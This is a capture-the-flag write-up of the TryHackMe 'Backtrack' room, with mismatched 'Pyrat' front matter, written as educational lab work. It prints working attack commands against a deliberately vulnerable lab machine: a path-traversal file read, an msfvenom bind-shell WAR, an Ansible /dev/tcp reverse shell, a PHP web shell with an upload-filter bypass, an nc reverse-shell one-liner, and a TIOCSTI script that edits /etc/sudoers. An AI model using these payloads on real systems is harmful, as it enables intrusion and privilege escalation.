---
title: Pyrat
date: 2024-10-12 13:30:00 +0200
categories:
  - TryHackMe
tags:
  - Web
  - CVE-2023-39141
  - File-Upload
  - LFI
  - Sudo
  - ttypushback
  - aria2
  - tomcat
description: Daring to set foot where no one has.
render_with_liquid: false
media_subpath: /assets/img/thm_images/tryhackme_Backtrack
image:
  path: room.png
---
## Room
![Room Card](room_card.png){: w="300" h="300" .center .shadow}

- **Title:** Backtrack 2.5
- **Name:** [Backtrack](https://tryhackme.com/r/room/backtrack)
- **Description:** Daring to set foot where no one has.
- **Creators**: [0utc4st](https://tryhackme.com/r/p/0utc4st) \| [YoloSaimo](https://tryhackme.com/r/p/YoloSaimo)

### Flags

1. What is the content of flag1.txt?
2. What is the content of flag2.txt?
3. What is the content of flag3.txt?

## Initial Recon
Let's start with an Nmap scan.

```console
m3ga@kali:~$ nmap -sS -Pn -v -p- -T4 -A -oN portscan.nmap 10.10.43.6
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
6800/tcp open  http            aria2 downloader JSON-RPC
| http-methods: 
|_  Supported Methods: OPTIONS
|_http-title: Site doesn't have a title.
8080/tcp open  http            Apache Tomcat 8.5.93
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Apache Tomcat/8.5.93
|_http-open-proxy: Proxy might be redirecting requests
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
```

There is something called `Aria2` running on port 8888.

![](<Pasted image 20241012135036.png>){: w="700" h="300" .center }

> [aria2.github.io](https://aria2.github.io/)
> 
> aria2 is a **lightweight** multi-protocol & multi-source command-line **download utility**. It supports **HTTP/HTTPS**, **FTP**, **SFTP**, **BitTorrent** and **Metalink**. aria2 can be manipulated via built-in **JSON-RPC** and **XML-RPC** interfaces.
{: .prompt-info}

There is also `Apache Tomcat 8.5.93` running on **port 8080**.

![](<Pasted image 20241012135047.png>){: w="700" h="300" .center }

Trying to access `/manager/status`, we are required to provide credentials.

![](<Pasted image 20241014194652.png>){: w="700" h="300" .center }

After some manual enumeration, I found the `Aria2`'s version within `settings > server info`

![](<Pasted image 20241014194954.png>){: w="700" h="300" .center }

## Flag 1
### CVE-2023-39141

Looking for vulnerabilities in this version, I found `CVE-2023-39141`.

> [nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2023-39141) - CVE-2023-39141
> 
> webui-aria2 commit 4fe2e was discovered to contain a path traversal vulnerability.
{: .prompt-info}

`Jafar Akhondali` has an the instructions to exploit this LFI vulnerability.

> [PoC](https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e) - CVE-2023-39141
> 
> When `node-server.js` is used, an attacker can simply request files outside the serving path 
> 
> `curl --path-as-is http://localhost:8888/../../../../../../../../etc/passwd`
{: .prompt-tip}

Trying this on the target works as expected.

```console
m3ga@kali:~$ curl --path-as-is http://10.10.235.123:8888/../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
...
tomcat:x:1002:1002::/opt/tomcat:/bin/false
orville:x:1003:1003::/home/orville:/bin/bash
wilbur:x:1004:1004::/home/wilbur:/bin/bash
```

Looking inside the `Apache Tomcat`'s user file (tomcat-users.xml), we find a username and a password to authenticate with.

```console
m3ga@kali:~$ curl --path-as-is "http://10.10.43.6:8888/../../../../../../opt/tomcat/conf/tomcat-users.xml"
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="[REDACTED]" roles="manager-script"/>

</tomcat-users>
```

We can successfully login with these credentials.

![](<Pasted image 20241012135413.png>){: w="700" h="300" .center }

### Shell as tomcat
Trying to get a **reverse-shell** on the target, I was unsuccessful. However, trying a `bind-shell` did the trick.

First, we create a malicious `.war` file and deploy it on the server. 

```console
m3ga@kali:~/tryhackme/Backtrack$ msfvenom -p java/jsp_shell_bind_tcp rhost=10.10.43.6 lport=4545 -f war -o ./m3ga.war
Payload size: 1123 bytes
Final size of war file: 1123 bytes
Saved as: ./m3ga.war
m3ga@kali:~/tryhackme/Backtrack$ curl --upload-file ./m3ga.war -u 'tomcat:[REDACTED]' 'http://10.10.43.6:8080/manager/text/deploy?path=/m3ga'
OK - Deployed application at context path [/m3ga]
```

Navigating to the location causes the payload to be executed and the port opened on the target.

```console
m3ga@kali:~/tryhackme/Backtrack$ curl http://10.10.43.6:8080/m3ga
```

Now we can simply connect to the port with netcat. We get a shell as the user `tomcat`. 
 
```console
m3ga@kali:~/tryhackme/Backtrack$ nc -nv 10.10.43.6 4545
(UNKNOWN) [10.10.43.6] 4545 (?) open
id
uid=1002(tomcat) gid=1002(tomcat) groups=1002(tomcat)

wilbur@Backtrack:/opt/tomcat$ ls -la
...
drwxr-x--- 2 tomcat tomcat  4096 Mar  9  2024 bin
drwxr-x--- 3 tomcat tomcat  4096 Mar  9  2024 conf
-rw-r--r-- 1 tomcat tomcat    38 Mar  9  2024 flag1.txt
...
tomcat@Backtrack:/opt/tomcat$ cat flag1.txt 
THM{[REDACTED]}
```

## Flag 2
### Shell as Wilbur
Checking the sudo privileges, I found out that this user can run `ansible-playbook /opt/test_playbooks/*.yml` as the user `wilbur`.

```console
tomcat@Backtrack:~$ sudo -l
Matching Defaults entries for tomcat on Backtrack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
```

Using wildcards (\*) in sudo rights is always risky. In this case, we can exploit this by doing something like this:

```bash
sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/evil.yml
``` 

It fits perfectly to the theme of the room.

Looking for ansible reverse shells, I found this.

```yaml
- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'
```

Let's save it to `/tmp/evil.yml` and run it with ansible.
```console
tomcat@Backtrack:~$ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/suspicious_ports.yml 
[WARNING]: provided hosts list is empty, only localhost is available. Note that
the implicit localhost does not match 'all'
....
```
```console
m3ga@kali:~/tryhackme/Backtrack$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.75.248] from (UNKNOWN) [10.10.43.6] 33124
wilbur@Backtrack:/tmp$ id
id
uid=1004(wilbur) gid=1004(wilbur) groups=1004(wilbur)
```

Perfect, we got a shell as `wilbur`.

Wilbur's credentials are stored in the file `.just_in_case.txt`. This was a nice checkpoint since the machine had to be restarted multiple times, It helped to get back to where I was quicker. 

```console
wilbur@Backtrack:~$ cat .just_in_case.txt 
in case i forget :

wilbur:[REDACTED]
```

### Shell as Orville
There's another file called `from_orville.txt` which contains a message and some credentials.

```console
wilbur@Backtrack:~$ cat from_orville.txt 
Hey Wilbur, it's Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I'd like you to test it yourself to see if everything works and secure.
I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:

email : orville@backtrack.thm
password : [REDACTED]
```

After running `linpeas` I saw that port 80 was running locally.

To access the local port 80 on the target, we can use **ssh** to create a **tunnel** to port 80 and access it on our own machine.

```console
m3ga@kali:~/tryhackme/Backtrack$ ssh -L 80:127.0.0.1:80 wilbur@10.10.8.14
wilbur@10.10.8.14's password: [REDACTED]
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-173-generic x86_64)
...
```

Navigating to `http://127.0.0.1`, we are greeted with `Orville's Gallery` website.

![](<Pasted image 20241012163115.png>){: w="700" h="300" .center }

I wrote a simply malicious `.php` code to upload.
```php
# shell.php
<?php
echo system($_GET['cmd']);
?>
```

Uploading php files doesn't seem to be allowed.
![](<Pasted image 20241012204214.png>){: w="700" h="300" .center }

We can bypass this by renaming the file `shell.php` to `shell.jpg.php` so that it includes "jpg" and gets passed the filter but **it's still a php file**.

After uploading it, it wasn't possible to execute it and it would just download the file. (This is done by modifying the `.htaccess` file for `apache`).
![](<Pasted image 20241012204117.png>){: w="700" h="300" .center }

However, we know that there are php files within the **root directory** of the webserver and they ARE being executed. What if we could upload our shell to the parent directory (`../uploads`)? 


Trying this with burp-suite, I was unsuccessful. It was still being uploaded, to the `/uploads` directory. This could mean that there are filters removing `../`.

Looking for ways to bypass this, I found `%252e%252e%252f` on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md).

Trying this out, the file actually got uploaded to the parent directory, and we can now execute code.

![](<Pasted image 20241012204345.png>){: w="700" h="300" .center }

The webserver is running as `orville` as expected.
```console
m3ga@kali:~$ curl 'http://127.0.0.1/shell4.jpg.php?cmd=id'
uid=1003(orville) gid=1003(orville) groups=1003(orville)
```

To get a shell I URL-encoded this payload:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.75.248 443 >/tmp/f
```

And then used `curl` to execute it on the target.
```console
m3ga@kali:~$ curl 'http://127.0.0.1/shell4.jpg.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20%2Di%202%3E%261%7Cnc%2010%2E11%2E75%2E248%20443%20%3E%2Ftmp%2Ff'


m3ga@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.75.248] from (UNKNOWN) [10.10.42.12] 60592
sh: 0: can't access tty; job control turned off
$ id
uid=1003(orville) gid=1003(orville) groups=1003(orville)
orville@Backtrack:~$ cat flag2.txt
THM{[REDACTED]}
```

The `db.php` files includes `orville`'s mysql password but it is useless. The password is not used anywhere else.
```console
orville@Backtrack:/var/www/html/includes$ cat db.php 
<?php
$host = 'localhost';
$dbname = 'backtrack';
$username = 'orville';
$password = '[REDACTED]';

try {
    $db = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
    die();
}
?>
```

## Flag 3

After some enumeration I found a `web_snapshot.zip` file. Which wasn't a big help but not useless either. This file made me think of where it came from. Looking for the background processes, we find that there is a zip command being executed every minute.

![](<Pasted image 20241014203624.png>){: w="700" h="300" .center }

I think this is where most of you including me got stuck at. I spent hours messing with the zip file, creating symlinks and whatever came to mind with no success.

Asking for some help on the discord channel, someone was kind enough to let me know about an ancient privilege escalation method.

### ttypushback

Researching what it was, I found this perfect blog explaning the vulnerability and the way it's exploited.

> [PoC](https://www.errno.fr/TTYPushback.html) - www.errno.fr
> 
> The TIOCSTI ioctl can insert bytes in the tty’s input queue. It is used to simulate terminal input.
> 
> When running `su lowpriv_user`, by default no new pty is allocated. 
> 
> Therefore since we’re still in the same pty, input can be sent directly _to the parent shell_ to execute commands in its context.
{: .prompt-tip}

If you notice in the background processes, some user is using `su - orville` to get a shell as `orville`. This is highly likely to be the root user.

To explain the exploit in simple terms:

- When the root user gets a shell as the normal user the shell that was running as root will keep running in the background.
- Both the root shell and the user shell are connected to each other. Since this is the case, we can directly send input to the root shell and execute commands as root.
- To execute commands in the root shell, we have to somehow make the root user execute some malicious code once it gets shell as `orville`. 

Let's save this script to `/home/orville/getroot.py`. This will simply add `orville` in the `/etc/sudoers` file so that the user is able to run anything as root without a password.
```python
#!/usr/bin/python3
import fcntl
import termios
import os
import signal

os.kill(os.getppid(), signal.SIGSTOP)

run_as_root = "echo 'orville ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"

for char in run_as_root + '\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```

To make the root user execute this code, we will put it inside the `.bashrc` file. This file is executed every time someone gets a shell as the user. 
```console
orville@Backtrack:~$ chmod +x getroot.py
orville@Backtrack:~$ nano .bashrc                                                                                                             
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

/home/orville/getroot.py
...
```

After waiting about 1 minute, we see that `orville` now has sudo rights to execute anything as root without providing a password .

```console
orville@Backtrack:~$ sudo -l
Matching Defaults entries for orville on Backtrack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User orville may run the following commands on Backtrack:
    (ALL) NOPASSWD: ALL
orville@Backtrack:~$ sudo su -
root@Backtrack:~# cat flag3.txt 

██████╗░░█████╗░░█████╗░██╗░░██╗████████╗██████╗░░█████╗░░█████╗░██╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
██████╦╝███████║██║░░╚═╝█████═╝░░░░██║░░░██████╔╝███████║██║░░╚═╝█████═╝░
██╔══██╗██╔══██║██║░░██╗██╔═██╗░░░░██║░░░██╔══██╗██╔══██║██║░░██╗██╔═██╗░
██████╦╝██║░░██║╚█████╔╝██║░╚██╗░░░██║░░░██║░░██║██║░░██║╚█████╔╝██║░╚██╗
╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

THM{[REDACTED]}
```

## Outro
Many thanks to the creators of this room, [0utc4st](https://tryhackme.com/r/p/0utc4st) | [YoloSaimo](https://tryhackme.com/r/p/YoloSaimo).

This room taught me a really cool privilege escalation method. Even though it's an old one, it's still a gold one ;)

\- m3gakr4nus
